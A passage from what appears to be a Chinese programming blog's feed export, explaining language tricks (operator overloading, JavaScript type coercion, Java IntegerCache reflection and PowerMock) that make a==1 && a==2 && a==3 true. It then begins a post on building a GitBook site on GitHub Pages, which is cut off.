<span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> num<span class="token punctuation">)</span> <span class="token punctuation">:</span>        self<span class="token punctuation">.</span>num <span class="token operator">=</span> num    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> num<span class="token punctuation">)</span> <span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>num <span class="token operator">&lt;=</span> num<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>    a <span class="token operator">=</span> NumOP<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">and</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">and</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"impossable!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span> <span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"It's right."</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span> <span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><p>而对于 ruby 则可以利用它的一个语法糖简单实现：调用函数函数时，其参数列表可以不写括号。</p><p>那么只需要定义一个无入参的函数 <code>a</code> ，根据条件动态控制函数 <code>a</code> 的返回值即可，其实现代码如下：</p><pre class="line-numbers language-ruby"><code class="language-ruby"><span class="token keyword">def</span> a    <span class="token variable">$i</span> <span class="token operator">||</span><span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment" spellcheck="true"># $i 是全局变量</span>    <span class="token variable">$i</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">end</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span>    puts <span class="token string">"impossable!"</span><span class="token keyword">else</span>    puts <span class="token string">"It's right."</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>对于 JavaScript ，可以利用运算符 <code>==</code> 的松散相等特性：当 <code>==</code> 两边操作数的类型不相同时， JS 引擎会尝试把其中一个操作数类型转换成另一个操作数类型。</p><p>在这题里面，若左侧操作数 <code>a</code> 是对象，右侧是数字，则会隐式调用对象 <code>a</code> 的 <code>valueOf</code> 方法将其转换成数字；若转换失败则调用 <code>toString</code> 方法后再将其转换成数字。</p><p>显然，只需要控制 <code>valueOf</code> 逻辑使其满足每次 <code>==</code> 的判定即可，其实现代码如下：</p><blockquote><p>注：此方法对于严格相等运算符 <code>===</code> 不起作用。</p></blockquote><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>    i<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>     valueOf<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"impossable!"</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"It's right."</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>这么多语言中，最麻烦的就是 Java 了。主要是 Java 不允许重写运算符，只能利用 <code>a</code> 做文章。</p><p>但 Java 要求 <code>==</code> 两边类型一致，而右侧的 <code>1</code>/<code>2</code>/<code>3</code> 是 <code>int</code> 基础类型，因此 <code>a</code> 会受到 Java 的 <strong>编译语法</strong> 约束，只可能是 <code>int</code> 基础类型或其包装类 <code>Integer</code>。而结合本题来看，<code>a</code> 只可能是 <code>Integer</code> 对象。</p><p>根据 Java 的语言特性，<code>Integer == int</code> 在比对之前，会自动拆包使得两边的类型一致，事实上会变成 <code>Integer.intValue() == int</code>。</p><p>理论上本应只需要重写 <code>Integer.intValue()</code> 即可。</p><p>而事实上 <code>Integer</code> 声明了 <code>final</code>，不允许被继承，直接导致无法重写 <code>Integer.intValue()</code>。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">Integer</span> <span class="token keyword">extends</span> <span class="token class-name">Number</span> <span class="token keyword">implements</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>换言之无法直接实现。</p><p>但是若条件变更如下，则有可能实现：</p><pre class="line-numbers language-java"><code class="language-java">a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该条件比对的是 <code>Integer == Integer</code>，由于两侧操作数均是对象，实际比对的是对象地址的引用，只需要想办法篡改两个引用的对象（使其相同）即可达到目的。</p><hr><p>此时可以利用 Java【静态缓存】的特性 —— <code>Integer</code> 为了优化空间和效率，对于特定范围的常量值会放入常量池：</p><ul><li>当 <code>Integer</code> 类 <strong>第一次</strong> 被载入内存时，会通过内部类 <code>IntegerCache</code> 把 <code>[-128, 127]</code> 范围内的整数包装成 <code>Integer</code> 对象并缓存到 <code>Integer cache[]</code> 数组。</li><li>以后再用 <code>Integer</code> 初始化变量时，若其赋值范围在 <code>[-128, 127]</code> 之间，则直接返回 <code>cache</code> 数组中对应的引用，不再重新开辟内存。</li></ul><p>详细可见 <code>Integer</code> 的源码：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">Integer</span> <span class="token keyword">extends</span> <span class="token class-name">Number</span> <span class="token keyword">implements</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">IntegerCache</span> <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">128</span><span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> high<span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token keyword">final</span> Integer cache<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// high value may be configured by property</span>            <span class="token keyword">int</span> h <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>            String integerCacheHighPropValue <span class="token operator">=</span>                VM<span class="token punctuation">.</span><span class="token function">getSavedProperty</span><span class="token punctuation">(</span><span class="token string">"java.lang.Integer.IntegerCache.high"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>integerCacheHighPropValue <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>integerCacheHighPropValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                    i <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// Maximum array size is Integer.MAX_VALUE</span>                    h <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> Integer<span class="token punctuation">.</span>MAX_VALUE <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token operator">-</span>low<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span> NumberFormatException nfe<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// If the property cannot be parsed into an int, ignore it.</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            high <span class="token operator">=</span> h<span class="token punctuation">;</span>            cache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">[</span><span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> low<span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> cache<span class="token punctuation">.</span>length<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>                cache<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// range [-128, 127] must be interned (JLS7 5.1.7)</span>            <span class="token keyword">assert</span> IntegerCache<span class="token punctuation">.</span>high <span class="token operator">>=</span> <span class="token number">127</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token function">IntegerCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Returns an {@code Integer} instance representing the specified     * {@code int} value.  If a new {@code Integer} instance is not     * required, this method should generally be used in preference to     * the constructor {@link #Integer(int)}, as this method is likely     * to yield significantly better space and time performance by     * caching frequently requested values.     *     * This method will always cache values in the range -128 to 127,     * inclusive, and may cache other values outside of this range.     *     * @param  i an {@code int} value.     * @return an {@code Integer} instance representing {@code i}.     * @since  1.5     */</span>    <span class="token annotation punctuation">@HotSpotIntrinsicCandidate</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Integer <span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> IntegerCache<span class="token punctuation">.</span>low <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;=</span> IntegerCache<span class="token punctuation">.</span>high<span class="token punctuation">)</span>            <span class="token keyword">return</span> IntegerCache<span class="token punctuation">.</span>cache<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">-</span>IntegerCache<span class="token punctuation">.</span>low<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>回到这题判断条件中的 <code>1</code>/<code>2</code>/<code>3</code>，因为是通过计算在 <code>IntegerCache</code> 数组索引，从而获取其包装类对象：</p><ul><li><code>(Integer) 1 =&gt; Integer.valueOf(1) =&gt; IntegerCache.cache[129]</code></li><li><code>(Integer) 2 =&gt; Integer.valueOf(2) =&gt; IntegerCache.cache[130]</code></li><li><code>(Integer) 3 =&gt; Integer.valueOf(3) =&gt; IntegerCache.cache[131]</code></li></ul><p>那么只需要篡改 <code>IntegerCache</code> 数组，使得：</p><ul><li><code>IntegerCache.cache[130] = IntegerCache.cache[129]</code></li><li><code>IntegerCache.cache[131] = IntegerCache.cache[129]</code></li></ul><p>就可以令 <code>1</code>/<code>2</code>/<code>3</code> 取得的包装类是同一个对象（此时的 <code>1</code>/<code>2</code>/<code>3</code> 纯粹就是索引值）。</p><p>篡改方法可以用例 Java 的反射机制：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span>AtomicInteger<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Java</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 利用反射机制获取 Integer cache[] 数组</span>        Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        Field field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Integer<span class="token punctuation">[</span><span class="token punctuation">]</span> cache <span class="token operator">=</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>        cache<span class="token punctuation">[</span><span class="token number">130</span><span class="token punctuation">]</span> <span class="token operator">=</span> cache<span class="token punctuation">[</span><span class="token number">129</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 令 (Integer) 2 = (Integer) 1</span>        cache<span class="token punctuation">[</span><span class="token number">131</span><span class="token punctuation">]</span> <span class="token operator">=</span> cache<span class="token punctuation">[</span><span class="token number">129</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 令 (Integer) 3 = (Integer) 1</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Integer a <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"impossable!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"It's right."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>但是这种做法不够优雅，毕竟改了题目。</p><p>那有没有不改题目的实现方式呢？</p><p>是有的。</p><p>虽然 <code>Integer</code> 声明了 <code>final</code>，不允许被继承，导致无法重写 <code>Integer.intValue()</code>。</p><p>但是可以利用 AOP 切到 <code>Integer.intValue()</code> 方法进行篡改。</p><p>在 Stack Overflow 就有人给出了类似的解题思路（理论上是可行的，但我并没有去验证，有兴趣的同学可以试试）：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span>AtomicInteger<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>Before<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>Test<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>runner<span class="token punctuation">.</span>RunWith<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>powermock<span class="token punctuation">.</span>core<span class="token punctuation">.</span>classloader<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>PrepareForTest<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>powermock<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>junit4<span class="token punctuation">.</span>PowerMockRunner<span class="token punctuation">;</span><span class="token annotation punctuation">@PrepareForTest</span><span class="token punctuation">(</span>Integer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token annotation punctuation">@RunWith</span><span class="token punctuation">(</span>PowerMockRunner<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestJava</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 利用 AOP 把 Integer.intValue() 替换为 AtomicInteger.getAndIncrement()     */</span>    <span class="token annotation punctuation">@Before</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">before</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        AtomicInteger ai <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 自增整数</span>        <span class="token function">replace</span><span class="token punctuation">(</span><span class="token function">method</span><span class="token punctuation">(</span>Integer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string">"intValue"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">with</span><span class="token punctuation">(</span>                <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> method<span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ai<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// lambda</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Integer a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"impossable!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"It's right."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="幕间"><a href="#幕间" class="headerlink" title="幕间"></a>幕间</h2><p>通过前面的解题过程可以发现，弱类型语言 相较于 强类型语言 会更容易实现底层逻辑篡改，主要是因为对语法特性的校验会更宽松。</p><blockquote><p>C++ 虽然和 Java 一样属于强类型语言，但是因为没有限制运算符重写而被钻了空子</p></blockquote><p>在渗透测试中，或者可以利用类似的手段，绕过一些条件语句达到目的。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 永假式 </tag>
            
            <tag> 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 GitBook 在 Github 搭建个人网站</title>
      <link href="/articles/website/gitbook-da-jian-ge-ren-wang-zhan/"/>
      <url>/articles/website/gitbook-da-jian-ge-ren-wang-zhan/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="传统的个人网站"><a href="#传统的个人网站" class="headerlink" title="传统的个人网站"></a>传统的个人网站</h3><p>在某个知名门户下面注册一个子域名，定制个性化内容。 例如 QQ空间、 博客园、 CSDN 等等。</p><p><strong>优点</strong>：</p><ul><li>无技术门槛</li><li>免费</li></ul><p><strong>缺点</strong>：</p><ul><li>站点风格受限： 只能使用有限的模板布置站点</li><li>文章数据无法直接迁移： 即使某些门户支持导出、也未必能导入到其他门户</li></ul><h3 id="稍微有点技术含量的个人网站"><a href="#稍微有点技术含量的个人网站" class="headerlink" title="稍微有点技术含量的个人网站"></a>稍微有点技术含量的个人网站</h3><p>租用一台云服务器，搭建一个 HTTP 服务，在其中放入你想展示的内容。</p><p><strong>优点</strong>：</p><ul><li>完全个性化：理论上只要你想到的都可以实现</li><li>能够赚钱： 广告引流、付费内容等</li><li>站点数据能够迁移： 一般存储在数据库中</li></ul><p><strong>缺点</strong>：</p><ul><li>收费： 租用个人云服务器最低配的差不多 ￥1000/年</li><li>其实并不能赚到什么钱：<br>　　· 百万流量广告引流？ 不好意思谷歌邮寄 PIN 码到国内 100% 丢件<br>　　· 内容付费？ 抱歉大部分人的文章并不足以让别人掏钱</li><li>非常繁琐的搭建过程和日常维护，来看一下你需要做什么：<br>　　· 申请域名、网站备案： 最快需要 1 个月<br>　　· 租用云服务器： 低配怕访问慢、高配怕财务困难<br>　　· 搭建 HTTP 服务： nginx、 apache<br>　　· 搭建数据库： MySQL、 MariaDB<br>　　· 搭建网站平台： wordpress、 Discuz!<br>　　· 网站平台模板/插件不好用： css、 js 各种魔改<br>　　· 安全加固： 后台被爆破、 前台被钓鱼<br>　　· 服务容灾： 进程挂起、 定期备份<br>　　· 访问加速： Redis缓存、 CDN<br>　　· 搜索引擎不收录： SEO、 提交链接</li></ul><p>把这些都处理好之后，终于可以开始发表文章，一切似乎都很安逸很顺利。</p><p>但很多问题就是发生了：</p><ul><li>写了几百篇文章之后，开始发现富文本编辑方式太呕心了</li><li>突然有一天某个内容解析插件升级之后，文章格式乱套了</li><li>突然某个 JS 链接被墙之后，发现 latex 公式变代码了</li></ul><p>难道想安逸地发表一些文章真的这么困难吗？</p><p>直到有一天我发现了 GitBook。</p><h2 id="GitBook-简介"><a href="#GitBook-简介" class="headerlink" title="GitBook 简介"></a>GitBook 简介</h2><p>GitBook 是一个基于 Node.js 的命令行工具，支持 Markdown 和 AsciiDoc 两种语法格式，可以把这种格式的文本输出为 HTML、 PDF、 eBook 等格式的电子书。</p><p>事实上可以认为 GitBook 的本质就是一个文档格式转换工具。</p><p>GitBook 社区具有丰富的主题模块和插件模块，而且这些 主题/插件 都是开源的，大部分都可以从 GitHub 上找到，所以可以很简单地找到我们需要的 主题/插件 ，甚至能简单地对其进行微调。</p><h2 id="为什么是-GitBook-amp-GitHub"><a href="#为什么是-GitBook-amp-GitHub" class="headerlink" title="为什么是 GitBook &amp; GitHub"></a>为什么是 GitBook &amp; GitHub</h2><p>其实当知道 GitBook 可以把 Markdown 转换成 HTML 格式电子书之后，就基本可以确定这个组合了：</p><ul><li>GitHub 天然支持 Markdown 语法，可以直接使用 Markdown 编写文章</li><li>GitHub 可以借用 Git 对文章进行版本管理</li><li>GitHub 为每个仓库提供了 300M 免费空间的 GitHub Pages （只支持 HTML），足够用于发布个人的静态网站</li><li>GitBook 可以把 Markdown 文章转换成 HTML 电子书供 GitHub Pages 发布</li><li>极简主义： 程序员的网站不需要太多花哨的东西，文章才是核心，站点越简洁越美观</li></ul><hr><h2 id="搭建-GitBook-环境"><a href="#搭建-GitBook-环境" class="headerlink" title="搭建 GitBook 环境"></a>搭建 GitBook 环境</h2><blockquote><p>GitBook 在 3.2.3 版本之后就开始收费了，但是收费之后反而阉割了不少功能，不建议使用最新版</p></blockquote><p>为了使得 GitBook 的运行环境可以固化在 